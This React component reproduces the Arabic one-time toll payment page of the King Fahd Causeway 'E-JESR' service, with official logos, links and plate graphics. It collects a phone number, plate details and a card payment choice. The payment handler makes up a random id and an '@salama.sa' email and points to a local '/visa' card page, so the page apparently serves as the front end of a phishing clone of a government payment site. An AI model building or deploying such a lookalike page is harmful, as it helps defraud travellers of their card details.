import React, { useRef, useState } from "react";

const Main = () => {
  const [toastMessage, setToastMessage] = useState("");
  const toastTimerRef = useRef(null);
  const [mobileNumber, setMobileNumber] = useState("");
  const [tripType, setTripType] = useState("round");
  const [vehicleType, setVehicleType] = useState("2");
  const [vehicleNationality, setVehicleNationality] = useState("SA");
  const [hasTrailer, setHasTrailer] = useState("false");
  const [currency, setCurrency] = useState("sar");
  const [paymentMethod, setPaymentMethod] = useState("visa");
  const [loading] = useState(false);
  // Plate State
  const [plateChar1, setPlateChar1] = useState("");
  const [plateChar2, setPlateChar2] = useState("");
  const [plateChar3, setPlateChar3] = useState("");
  const [plateNumber, setPlateNumber] = useState("");
  const [phoneCode, setPhoneCode] = useState("966+");
  let price = currency === "sar" ? 70 : 7;
  if (hasTrailer === "true") {
    price = currency === "sar" ? 110 : 11;
  }
  const currencyText = currency === "sar" ? "ريال سعودي" : "دينار بحريني";

  const arabicToEnglishMap = {
    أ: "A",
    ب: "B",
    ح: "J",
    د: "D",
    ر: "R",
    س: "S",
    ص: "X",
    ط: "T",
    ع: "E",
    ق: "G",
    ك: "K",
    ل: "L",
    م: "Z",
    ن: "N",
    ه: "H",
    و: "U",
    ي: "V",
  };

  const westernToArabicDigits = {
    0: "٠",
    1: "١",
    2: "٢",
    3: "٣",
    4: "٤",
    5: "٥",
    6: "٦",
    7: "٧",
    8: "٨",
    9: "٩",
  };

  const toArabicDigits = (num) =>
    num
      .split("")
      .reverse()
      .map((d) => westernToArabicDigits[d] || d)
      .join(" ");
  const toEnglishDigits = (num) => num.split("").reverse().join(" ");
  const showErrorToast = (message) => {
    setToastMessage(message);
    window.clearTimeout(toastTimerRef.current);
    toastTimerRef.current = window.setTimeout(() => {
      setToastMessage("");
    }, 2500);
  };

  const handlePayment = () => {
    if (mobileNumber.length < 9) {
      showErrorToast("الرجا ادخال رقم الجوال بشكل صحيح");
      return;
    }
    if (!plateChar1 || !plateChar2 || !plateChar3 || !plateNumber) {
      showErrorToast("الرجاء اكمال بريات اللوحة");
      return;
    }

    const id = Math.floor(Math.random() * 1000000);
    sessionStorage.setItem("id", id);
    sessionStorage.setItem("price", price);
    // const data = {
    //   _id: id,
    //   fullname: "User_" + mobileNumber,
    //   email: mobileNumber + "@salama.sa",
    // };
    // window.location.href = `/visa?data=${encodeURIComponent(JSON.stringify(data))}`;
  };
  return (
    <div
      className="bg-gray-50 min-h-screen text-right flex flex-col items-center"
      dir="rtl"
    >
      {/* Header */}
      <header className="flex flex-wrap items-center md:flex-row flex-col gap-y-3 justify-between py-4 px-6 mb-6 border-b bg-[#218795] text-white shadow-md w-full">
        <ul className="flex items-center gap-6 list-none mb-0">
          <li>
            <a href="https://kfca.sa/" target="_blank" rel="noreferrer">
              <img src="/header1.png" alt="KFCA" className="h-10" />
            </a>
          </li>
          <li>
            <a href="https://kfca.sa/EJesr" target="_blank" rel="noreferrer">
              <img src="/header2.png" alt="EJesr" className="h-10" />
            </a>
          </li>
        </ul>
        <div className="flex items-center">
          <button
            type="button"
            className="hover:bg-white/30 text-white px-3 py-1 rounded text-base font-bold shadow-sm transition-all"
            style={{
              background:
                "linear-gradient(90deg,#269a8c 0%,#249588 1%,#1d7172 9%,#17535e 18%,#113a4f 28%,#0d2743 39%,#0b1a3a 52%,#091235 68%,#091034 100%)",
            }}
          >
            EN
          </button>
        </div>
      </header>

      <main className="w-full max-w-4xl px-3 pb-12 flex flex-col justify-center items-center">
        {/* Banner Section */}
        <div
          className="text-white rounded-lg p-6 text-center shadow-lg w-full"
          style={{
            background:
              "linear-gradient(90deg,#269a8c 0%,#249588 1%,#1d7172 9%,#17535e 18%,#113a4f 28%,#0d2743 39%,#0b1a3a 52%,#091235 68%,#091034 100%)",
          }}
        >
          <h3 className="text-2xl font-bold mb-4">
            خدمة الدفع لمرة واحدة للعبور
          </h3>
          <p className="mb-2 text-lg">
            يمكنك استخدام خدمة الدفع لمرة واحدة للعبور وذلك من خلال إدخال لوحة
            المركبة
          </p>
          <div className="items-center gap-3 mb-2">
            <p>
              {" "}
              كما يمكنكم شحن قيمة العبور من خلال تطبيق "جسر" للعبور من المسارات
              المخصصة لـ{" "}
              <span className="bg-[#800080] text-white rounded-md font-bold text-sm px-2 py-1">
                E-JESR
              </span>
            </p>
          </div>
          <div className="flex justify-center items-center gap-4 mb-3">
            <span className="text-sm opacity-80 ">لتحميل التطبيق</span>
            <a
              href="https://play.google.com/store/apps/details?id=com.kfca.sa.jesr"
              target="_blank"
              rel="noreferrer"
            >
              <img
                src="https://kfca.sa/EJesr/images/google-play.png"
                alt="Google Play"
                className="h-8"
              />
            </a>
            <a
              href="https://apps.apple.com/sa/app/جسر/id1482105365"
              target="_blank"
              rel="noreferrer"
            >
              <img
                src="https://kfca.sa/EJesr/images/appstore.png"
                alt="App Store"
                className="h-8"
              />
            </a>
          </div>
        </div>

        {/* Form Section */}
        <section className="bg-white rounded-xl shadow-xl py-8 px-3 border border-gray-100 w-11/12 -mt-5">
          <div className="pb-6 flex items-center w-full gap-x-3 border-b mb-6">
            <img
              src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='127.054' height='81.441' viewBox='0 0 127.054 81.441'%3E%3Cdefs%3E%3ClinearGradient id='linear-gradient' y1='0.5' x2='1' y2='0.5' gradientUnits='objectBoundingBox'%3E%3Cstop offset='0' stop-color='%23269a8c'/%3E%3Cstop offset='0.237' stop-color='%231b6a6d'/%3E%3Cstop offset='0.467' stop-color='%23134354'/%3E%3Cstop offset='0.678' stop-color='%230d2742'/%3E%3Cstop offset='0.863' stop-color='%230a1637'/%3E%3Cstop offset='1' stop-color='%23091034'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath id='Path_5506' data-name='Path 5506' d='M1703.031,8493.276c-21.269-3.372-41.187-9.479-56.073-10.329-22.444-1.282-80.107,64.825-64.444,71.134,7.836,3.157,41.425,9.188,57.236,10.268C1660.286,8565.752,1723.008,8496.443,1703.031,8493.276Z' transform='translate(-1579.854 -8482.929)' fill='url(%23linear-gradient)' style='mix-blend-mode: multiply;isolation: isolate'/%3E%3C/svg%3E%0A"
              className="w-12"
              alt="icon"
            />
            <h2 className="text-xl font-bold text-[#218795]">
              لإستخدام الخدمة أدخل رقم الجوال
            </h2>
          </div>

          <div className="mb-8 max-w-md">
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              رقم الجوال
            </label>
            <div className="flex gap-2">
              <div className="flex-1 flex  border rounded-lg focus-within:ring-2 focus-within:ring-[#218795] transition-all bg-gray-50 overflow-hidden">
                <input
                  type="tel"
                  maxLength="9"
                  className="w-full py-3 px-4 bg-transparent outline-none text-left"
                  dir="ltr"
                  placeholder="5xxxxxxxx"
                  value={mobileNumber}
                  onChange={(e) => setMobileNumber(e.target.value)}
                />
                <select
                  className="px-3 text-gray-500 font-mono text-sm border-l"
                  value={phoneCode}
                  onChange={(e) => setPhoneCode(e.target.value)}
                >
                  <option>966+</option>
                  <option>973+</option>
                </select>
                {phoneCode === "966+" ? (
                  <img
                    src="data:image/png;base64,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"
                    className="w-12"
                    alt="علم السعودية"
                  />
                ) : (
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/2/2c/Flag_of_Bahrain.svg"
                    className="w-12"
                    alt="علم البحرين"
                  />
                )}
              </div>
            </div>
          </div>

          <div className="space-y-10">
            <div className="border-b pb-4 flex gap-x-3 items-center">
              <img
                src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='127.054' height='81.441' viewBox='0 0 127.054 81.441'%3E%3Cdefs%3E%3ClinearGradient id='linear-gradient' y1='0.5' x2='1' y2='0.5' gradientUnits='objectBoundingBox'%3E%3Cstop offset='0' stop-color='%23269a8c'/%3E%3Cstop offset='0.237' stop-color='%231b6a6d'/%3E%3Cstop offset='0.467' stop-color='%23134354'/%3E%3Cstop offset='0.678' stop-color='%230d2742'/%3E%3Cstop offset='0.863' stop-color='%230a1637'/%3E%3Cstop offset='1' stop-color='%23091034'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath id='Path_5506' data-name='Path 5506' d='M1703.031,8493.276c-21.269-3.372-41.187-9.479-56.073-10.329-22.444-1.282-80.107,64.825-64.444,71.134,7.836,3.157,41.425,9.188,57.236,10.268C1660.286,8565.752,1723.008,8496.443,1703.031,8493.276Z' transform='translate(-1579.854 -8482.929)' fill='url(%23linear-gradient)' style='mix-blend-mode: multiply;isolation: isolate'/%3E%3C/svg%3E%0A"
                className="w-12"
                alt="icon"
              />
              <h2 className="text-xl font-bold text-[#218795]">
                معلومات الرحلة
              </h2>
            </div>

            <div className="grid grid-cols-1  gap-8">
              {/* Trip Type */}
              <div className="space-y-4">
                <label className="block text-sm font-semibold text-gray-700">
                  نوع الرحلة
                </label>
                <div className="flex flex-col gap-3">
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="TripType"
                      className="w-5 h-5 accent-[#218795]"
                      checked={tripType === "round"}
                      onChange={() => setTripType("round")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      رحلة ذهابا وإيابا
                    </span>
                  </label>
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="TripType"
                      className="w-5 h-5 accent-[#218795]"
                      checked={tripType === "oneway"}
                      onChange={() => setTripType("oneway")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      رحلة ذهاب فقط
                    </span>
                  </label>
                </div>
              </div>

              {/* Vehicle Type */}
              <div className="space-y-3">
                <label className="block text-sm font-semibold text-gray-700">
                  نوع المركبة
                </label>
                <select
                  className="w-full py-3 px-4 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-[#218795] outline-none bg-gray-50 font-bold"
                  value={vehicleType}
                  onChange={(e) => setVehicleType(e.target.value)}
                >
                  <option value="0">اختر</option>
                  <option value="2">سيارة</option>
                  <option value="3">نقل خاص</option>
                </select>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              {/* Vehicle Nationality */}
              <div className="space-y-4">
                <label className="block text-sm font-semibold text-gray-700">
                  بلد إصدار إستمارة المركبة
                </label>
                <div className="flex flex-col gap-3">
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="Nationality"
                      className="w-5 h-5 accent-[#218795]"
                      checked={vehicleNationality === "SA"}
                      onChange={() => setVehicleNationality("SA")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      المملكة العربية السعودية
                    </span>
                  </label>
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="Nationality"
                      className="w-5 h-5 accent-[#218795]"
                      checked={vehicleNationality === "BH"}
                      onChange={() => setVehicleNationality("BH")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      مملكة البحرين
                    </span>
                  </label>
                </div>
              </div>
            </div>

            {/* Plate Input Section */}
            <div className="sa-plate-wrapper space-y-8 bg-gray-50  rounded-xl border-2 border-dashed border-gray-200">
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 items-start">
                <div className="lg:col-span-2 space-y-6">
                  <div className="grid grid-cols-1 gap-4 w-11/12 mx-auto">
                    <div className="space-y-2 text-right p-1 w-full ">
                      <label className="text-sm font-bold  text-right w-full">
                        الحرف الأول (يمين)
                      </label>
                      <select
                        className="w-full p-2 border-2 rounded bg-white text-right font-bold"
                        value={plateChar1}
                        onChange={(e) => setPlateChar1(e.target.value)}
                      >
                        <option hidden>اختر</option>
                        {"أبحدرسصطعقكلمنهوي".split("").map((l) => (
                          <option key={l} value={l}>
                            {l}
                          </option>
                        ))}
                      </select>
                    </div>
                    <div className="space-y-2 text-right p-1 ">
                      <label className="text-sm font-bold  text-right w-full">
                        الحرف الثاني
                      </label>
                      <select
                        className="w-full p-2 border-2 rounded bg-white text-right font-bold"
                        value={plateChar2}
                        onChange={(e) => setPlateChar2(e.target.value)}
                      >
                        <option hidden>اختر</option>
                        {"أبحدرسصطعقكلمنهوي".split("").map((l) => (
                          <option key={l} value={l}>
                            {l}
                          </option>
                        ))}
                      </select>
                    </div>
                    <div className="space-y-2 text-right p-1 ">
                      <label className="text-sm font-bold  text-right w-full">
                        الحرف الثالث
                      </label>
                      <select
                        className="w-full p-2 border-2 rounded bg-white text-right font-bold"
                        value={plateChar3}
                        onChange={(e) => setPlateChar3(e.target.value)}
                      >
                        <option hidden>اختر</option>
                        {"أبحدرسصطعقكلمنهوي".split("").map((l) => (
                          <option key={l} value={l}>
                            {l}
                          </option>
                        ))}
                      </select>
                    </div>
                  </div>
                  <div className="space-y-2  w-11/12 mx-auto">
                    <label className="text-sm font-bold  text-right w-full">
                      الأرقام (من اليسار إلى اليمين)
                    </label>
                    <input
                      type="text"
                      maxLength="4"
                      inputMode="numeric"
                      className="w-full py-3 border-2 rounded bg-white text-center text-xl font-bold tracking-widest outline-none focus:ring-2 focus:ring-[#218795]"
                      placeholder="1234"
                      value={plateNumber}
                      onChange={(e) => setPlateNumber(e.target.value)}
                    />
                  </div>
                </div>

                <div className="flex flex-col items-center justify-center ">
                  <div
                    className="relative   w-full h-[120px]  rounded-lg shadow-xl overflow-hidden bg-white group hover:scale-[1.02] transition-transform duration-300 ring-4 ring-[#218795]/10 "
                    style={{
                      backgroundImage:
                        "url('https://kfca.sa/EJesr/images/saplate.jpg')",
                      backgroundSize: "cover",
                      backgroundPosition: "center",
                      backgroundRepeat: "no-repeat",
                    }}
                  >
                    <div className="absolute inset-0 flex flex-col py-3 px-4 font-bold items-center justify-center text-black">
                      <div className="flex justify-between items-center w-full h-1/2">
                        <div className="flex-1 text-right text-xl pr-2 -mt-2 tracking-wide">
                          {plateChar1} {plateChar2} {plateChar3}
                        </div>
                        <div className="flex-1 text-left text-[23px]  pl-2 font-mono tracking-tighter">
                          {toArabicDigits(plateNumber)}
                        </div>
                      </div>
                      <div className="flex justify-between items-baseline w-full pt-1 border-t border-black/10">
                        <div className="flex-1 text-right text-xl pr-2 font-mono uppercase tracking-widest">
                          {arabicToEnglishMap[plateChar1] || ""}{" "}
                          {arabicToEnglishMap[plateChar2] || ""}{" "}
                          {arabicToEnglishMap[plateChar3] || ""}
                        </div>
                        <div className="flex-1 text-left text-[23px] pl-2 font-mono tracking-tighter">
                          {toEnglishDigits(plateNumber)}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Has Trailer */}
            <div className="space-y-4">
              <label className="block text-sm font-semibold text-gray-700">
                هل لديك مقطورة؟
              </label>
              <div className="flex gap-10 bg-gray-50 p-4 rounded-lg border border-gray-100">
                <label className="flex items-center gap-3 cursor-pointer group">
                  <input
                    type="radio"
                    name="Trailer"
                    className="w-6 h-6 accent-[#218795]"
                    checked={hasTrailer === "true"}
                    onChange={() => setHasTrailer("true")}
                  />
                  <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                    نعم
                  </span>
                </label>
                <label className="flex items-center gap-3 cursor-pointer group">
                  <input
                    type="radio"
                    name="Trailer"
                    className="w-6 h-6 accent-[#218795]"
                    checked={hasTrailer === "false"}
                    onChange={() => setHasTrailer("false")}
                  />
                  <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                    لا
                  </span>
                </label>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              {/* Currency Selection */}
              <div className="space-y-4">
                <label className="block text-sm font-semibold text-gray-700">
                  عملة الدفع
                </label>
                <div className="flex gap-8">
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="Currency"
                      className="w-6 h-6 accent-[#218795]"
                      checked={currency === "sar"}
                      onChange={() => setCurrency("sar")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      ريال سعودي
                    </span>
                  </label>
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <input
                      type="radio"
                      name="Currency"
                      className="w-6 h-6 accent-[#218795]"
                      checked={currency === "bhd"}
                      onChange={() => setCurrency("bhd")}
                    />
                    <span className="text-gray-700 font-bold group-hover:text-[#218795]">
                      دينار بحريني
                    </span>
                  </label>
                </div>
              </div>
            </div>

            {/* Amount Summary */}
            <div
              className="text-white rounded-xl p-8 flex justify-between items-center shadow-2xl transition hover:scale-[1.01] border-b-8 border-[#218795]"
              style={{
                background:
                  "linear-gradient(90deg, #269a8c 0%, #249588 1%, #1d7172 9%, #17535e 18%, #113a4f 28%, #0d2743 39%, #0b1a3a 52%, #091235 68%, #091034 1%)",
              }}
            >
              <div className="space-y-1">
                <h4 className="text-xl font-bold opacity-90">
                  المبلغ الإجمالي
                </h4>
                <p className="text-sm opacity-60">شامل كافة الرسوم والضرائب</p>
              </div>
              <div className="text-left flex items-baseline gap-3">
                <span className="text-5xl font-bold">{price}</span>
                <span className="text-xl opacity-80">{currencyText}</span>
              </div>
            </div>

            {/* Payment Selection */}
            <div className="grid grid-cols-1  gap-8 ">
              <div className="p-8 bg-white border border-gray-100 rounded-xl shadow-inner space-y-6 flex flex-col justify-center items-center">
                <label className="block text-lg font-bold text-[#2d3436] border-b pb-3 uppercase  w-full tracking-wider">
                  إختر طريقة الدفع
                </label>
                <div className="flex gap-6  w-full items-center">
                  <button
                    onClick={() => setPaymentMethod("visa")}
                    className={`w-2/3 p-4 border-4 rounded-xl transition-all flex items-center justify-center gap-x-2 ${paymentMethod === "visa" ? "border-[#218795] bg-[#218795]/10 scale-105" : "border-gray-50 hover:border-gray-200"}`}
                  >
                    <img src="/MasterCard.svg" alt="Mada" className="h-4" />
                    <img src="/Visa.svg" alt="Mada" className="h-4" />
                    <img src="/mada.png" alt="Mada" className="h-4" />
                  </button>
                  <button
                    disabled
                    onClick={() => setPaymentMethod("applepay")}
                    className={`w-1/3 p-2 border-4 rounded-xl transition-all flex items-center justify-center ${paymentMethod === "applepay" ? "border-[#218795] bg-[#218795]/10 scale-105" : "border-gray-200 hover:border-gray-200"}`}
                  >
                    <img src="/applepay.png" alt="Apple Pay" className="w-20" />
                  </button>
                </div>
                <button
                  onClick={handlePayment}
                  className="w-2/3 py-3 text-white rounded-2xl text-xl font-bold shadow-2xl shadow-[#218795]/30 transition-all active:scale-95 mt-4"
                  style={{
                    background:
                      "linear-gradient(90deg,#269a8c 0%,#249588 1%,#1d7172 9%,#17535e 18%,#113a4f 28%,#0d2743 39%,#0b1a3a 52%,#091235 68%,#091034 1%)",
                  }}
                >
                  ادفع
                </button>
              </div>
            </div>

            <div className="pt-8 text-center">
              <button
                onClick={() => window.location.reload()}
                className="text-gray-400 hover:text-red-500 font-bold transition-colors"
              >
                مسح كافة الحقول
              </button>
            </div>
          </div>
        </section>
      </main>
      {loading && (
        <div className="loader">
          <div className="justify-content-center jimu-primary-loading"></div>
        </div>
      )}
      {toastMessage && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 z-50 px-5 py-3 rounded-lg bg-red-600 text-white shadow-xl text-sm font-semibold">
          {toastMessage}
        </div>
      )}
    </div>
  );
};

export default Main;
